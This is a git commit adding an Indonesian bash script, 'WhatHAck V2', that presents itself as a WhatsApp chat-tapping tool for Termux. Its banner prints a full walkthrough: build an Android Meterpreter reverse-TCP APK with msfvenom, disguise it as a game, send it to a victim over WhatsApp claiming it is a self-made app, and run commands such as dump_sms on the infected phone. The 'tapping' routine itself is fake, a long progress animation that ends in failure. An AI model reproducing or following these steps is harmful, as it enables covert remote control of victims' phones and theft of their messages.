942ce2473718271d8182aee90d3532f98385979c
fendikidang <50740208+fendikidang@users.noreply.github.com>
2019-07-25 19:22:47 +0700

    Add files via upload

---
+++ WhatsMetas.sh
@@ -0,0 +1,296 @@
+clear
+bi='\033[34;1m' #biru
+i='\033[32;1m' #ijo
+pur='\033[35;1m' #purple
+cy='\033[36;1m' #cyan
+me='\033[31;1m' #merah
+pu='\033[37;1m' #purple
+ku='\033[33;1m' #kuning
+echo
+clear
+echo
+echo $bi"                 --------------" $ku"Selamat Datang Brohh" $bi"--------------"
+sleep 5
+echo
+echo
+echo $bi"            ============================================================"
+echo
+echo $ku"                       Nama       :" $cy"Mr.Rakus"
+echo $ku"                       Nama Tools :" $cy"WhatHAck V2"
+echo $ku"                       WA         :" $cy"082338065465"
+echo $ku"                       IG         :" $cy"fendipercel__"
+echo $ku"                       Github     :" $cy"https://github.com/fendikidang"
+echo
+echo $bi"            ============================================================"
+sleep 3
+echo
+echo $i"      Terimakasih Kepada"
+sleep 1
+echo $me"   [+] Mr.Tepos"
+sleep 1
+echo $me"   [+] Mr.Rakus"
+sleep 1
+echo $me"   [+] Mrx.Pen"
+sleep 2
+echo $me"     Team Saya"
+sleep 1
+echo $me"   [+] TJT {Tikus Jawa Timur}"
+sleep 1
+echo $me"   [+] Exsploit Cyber Ngawi"
+sleep 5
+echo
+echo $me"      Peraturan Memkai"
+sleep 2
+echo
+echo $bi"     [1. Install Metasploit Dulu"
+echo $bi"     [2. Jangan Dibuat Kejahatan"
+sleep 2
+echo
+echo $me"         [+] Cara Memakai"
+echo $me"       [*] Install Metasploit dulu"
+echo $me"       [*] Jika Sudah Di Install Metasploit Ketik $ msfvenom -p android/meterpreter/reverse_tcp LHOST=IP Kalian LPORT=4444 R > ChitGame.apk"
+echo $me"       [*] Jika Sudah Masuk Ketik $ chmod 777 ChitGame.apk"
+echo $me"       [*] Lanjut Ketik $ msfconsole"
+echo $me"       [*] Jika Sudah Masuk Metasploit,Ketik $ use multi/handler"
+echo $me"       [*] Lanjut Ketik Lagi $ set payload android/meterpreter/reverse_tcp"
+echo $me"       [*] Lanjut Ketik $ set lhost IP KALIAN"
+echo $me"       [*] Ketik Lagi $ set LPORT 4444"
+echo $me"       [*] Ketik Lagi $ exploit"
+echo $me"       [*] Jika Sudah Cari File APK Nya Diberkas,Karena Saya Tadi Saya Kasih Nama File Nya ChitGAme.apk,Jadi Saya Cari Itu Diberkas"
+echo $me"       [*] Kalo Udah Ketemu Kasih Apk Lewat WA Ke Target Kamu,Bilang Aja apk Buatan Sendiri"
+echo $me"       [*] Kalo Sudah Keinstall Korban Kita Lanjut Ketik $ help"
+echo $me"       [*] Maka Otomatis Akan Muncul Perintah-Perinthnya Contoh dump_sms,Buat Liat SMS"
+sleep 2
+echo
+echo $pur"           SELAMAT MENGGUNAKAN DAPET SALAM DARI Mr.Rakus"
+sleep 1
+echo
+echo $i"           [1.Install Metasploit"
+echo
+echo $bi"                 ╭──[Pilih NO Nya Kak]"
+read -p"                 ╰───────@Mr.Rakus : " pil
+sleep 4
+clear
+echo $bi"            ============================================================"
+echo
+echo $ku"                       Nama       :" $cy"Mr.Rakus"
+echo $ku"                       Nama Tools :" $cy"WhatHAck V2"
+echo $ku"                       WA         :" $cy"082338065465"
+echo $ku"                       IG         :" $cy"fendipercel__"
+echo $ku"                       Github     :" $cy"https://github.com/fendikidang"
+echo
+echo $bi"            ============================================================"
+sleep 2
+echo
+
+if [ $pil = 1 ]
+then
+clear
+figlet -f slant "W A I T"|lolcat
+figlet -f slant "Mrx.Pen"|lolcat
+sleep 2
+pkg install unstable-repo
+pkg install metasploit
+msfconsole
+fi
+
+echo $i"            #Sadap Chat WA"
+sleep 1
+echo $me"               Masukan NO WA anda"
+echo $bi"                 ╭──[++++++++++++++]"
+read -p"                 ╰───────@Mrx.Pen : " pil
+echo
+echo $bi"           Mengecek NO WA"
+sleep 1
+echo $me"           !"
+sleep 1
+echo $me"           !!"
+sleep 1
+echo $me"           !!!"
+sleep 1
+echo $me"           !!!!"
+sleep 1
+echo $me"           !!!!!"
+sleep 1
+echo $me"           !!!!!!"
+sleep 1
+echo $me"           !!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!!!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!!!!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!!!!!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!!!!!!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!!!!!!!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!!!!!!!!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!!!!!!!!!!!!!!"
+sleep 2
+echo $me"           !!!!!!!!!!!!!!!!!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!!!!!!!!!!!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!!!!!!!!!!!!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!!!!!!!!!!!!!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!!!!!!!!!!!!!!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!!!!!!!!!!!!!!!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!!!!!!!!!!!!!!!!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
+sleep 5
+echo $me"           !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
+sleep 1
+echo $me"           !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
+sleep 1
+echo
+echo $i"          #Succes Kak"
+sleep 3
+echo
+echo $me"               Masukan NO WA Korban"
+echo $bi"                 ╭──[++++++++++++++]"
+read -p"                 ╰───────@Mrx.Pen : " pil
+sleep 2
+echo
+echo $bi"        Proses Scan"
+echo $bi"        Tunggu Proses Agak Lama"
+sleep 60
+echo
+echo $me"       Gagal!!"
+sleep 1
+echo
+echo $i"      WhatsApp Sudah Ganti BUG"
+sleep 1
+echo $i"      Segera Perabarui BUG Itu"
+sleep 1
+echo $ku"     TERIMAKASIH TELAH MENGGUNAKAN TOOLS INI"
+sleep 1
+echo $ku"     JIKA ADA YANG DI TANYAKAN HUB WA : 082338065465"
+sleep 1
+echo $ku"     JANGAN LUPA FOLLOW IG SAYA @fendipercel__"
+sleep 1
+echo $ku"     SALAM HACKING"
+sleep 1
+figlet -f slant "Mr.Rakus"|lolcat
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
